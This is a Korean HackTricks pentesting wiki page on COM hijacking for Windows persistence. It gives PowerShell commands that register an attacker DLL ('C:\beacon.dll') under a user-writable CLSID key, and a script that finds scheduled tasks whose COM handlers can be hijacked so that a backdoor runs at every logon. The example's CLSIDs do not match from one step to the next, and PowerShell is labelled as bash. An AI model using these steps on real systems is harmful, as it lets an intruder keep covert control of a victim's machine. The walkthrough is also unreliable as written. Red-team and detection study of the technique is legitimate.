# COM 하이재킹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

### 존재하지 않는 COM 구성 요소 검색

HKCU의 값은 사용자에 의해 수정될 수 있으므로 **COM 하이재킹**은 **지속적인 메커니즘**으로 사용될 수 있습니다. `procmon`을 사용하면 존재하지 않는 COM 레지스트리를 찾아서 공격자가 지속성을 유지할 수 있습니다. 필터:

* **RegOpenKey** 작업.
* _결과_가 **NAME NOT FOUND**인 경우.
* _경로_가 **InprocServer32**로 끝나는 경우.

존재하지 않는 COM을 가장할 것으로 결정한 후 다음 명령을 실행하세요. _몇 초마다 로드되는 COM을 가장하려는 경우에는 주의하세요._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows 작업은 사용자 지정 트리거를 사용하여 COM 개체를 호출하며, 작업 스케줄러를 통해 실행되기 때문에 트리거가 발생할 때 예측하기가 더 쉽습니다.

<pre class="language-powershell"><code class="lang-powershell"># COM CLSID 표시
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "작업 이름: " $Task.TaskName
Write-Host "작업 경로: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# 샘플 출력:
<strong># 작업 이름:  예제
</strong># 작업 경로:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [이전과 유사한 내용...]</code></pre>

출력을 확인하여 예를 들어 **사용자가 로그인할 때마다** 실행되는 작업을 선택할 수 있습니다.

이제 **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** 및 HKLM 및 HKCU에서 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**를 검색하면 일반적으로 HKCU에 값이 존재하지 않는 것을 확인할 수 있습니다.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
그럼, 당신은 HKCU 항목을 만들고 사용자가 로그인할 때마다 백도어가 실행될 것입니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 당신의 해킹 기법을 공유하세요.

</details>
